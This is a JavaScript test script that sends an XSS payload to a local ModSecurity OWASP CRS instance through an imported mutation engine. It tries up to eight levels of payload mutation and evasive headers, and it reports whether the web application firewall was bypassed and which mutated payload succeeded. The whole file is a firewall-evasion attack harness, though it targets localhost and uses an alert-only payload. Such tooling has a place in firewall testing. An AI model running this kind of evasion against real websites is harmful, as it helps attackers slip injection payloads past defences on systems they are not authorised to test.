import { sendWithMutations } from './src/engines/mutationEngine.js';
import axios from 'axios';

async function main() {
    console.log('🧪 Testing Mutation Engine against Real ModSecurity OWASP CRS');

    const targetUrl = 'http://localhost:8081/?id=1';
    // Use an aggressive XSS payload that ModSec definitely catches
    const maliciousPayload = '<script>alert("XSS_TEST")</script>';

    console.log(`\nTarget: ${targetUrl}`);
    console.log(`Payload: ${maliciousPayload}`);
    console.log(`\n--- Initiating Attack ---`);

    const requestFn = async (currentPayload, evasiveHeaders = {}, requestOptions = {}) => {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set('payload', currentPayload);
        
        return axios.get(testUrl.toString(), { 
            headers: evasiveHeaders, 
            validateStatus: () => true,
            timeout: 5000
        });
    };

    try {
        const result = await sendWithMutations(maliciousPayload, requestFn, true, 'http://localhost:8081');
        
        if (result && result.status === 200 && result._evasionLevel) {
            console.log(`\n✅ SUCCESS: Bypassed Real ModSecurity using Level ${result._evasionLevel} (${result._evasionName})`);
            console.log(`   Mutated Payload: ${result._mutatedPayload}`);
            console.log(`   HTTP Status: ${result.status}`);
        } else if (result && result.status === 200) {
            console.log(`\n⚠️ Request went through but evasion was not triggered (or false positive).`);
            console.log(`   HTTP Status: ${result.status}`);
        } else {
            console.error('\n❌ FAILED to bypass ModSecurity. All 8 levels exhausted.');
        }
    } catch (err) {
        console.error('Test script error:', err.message);
    }
}

main().catch(console.error);
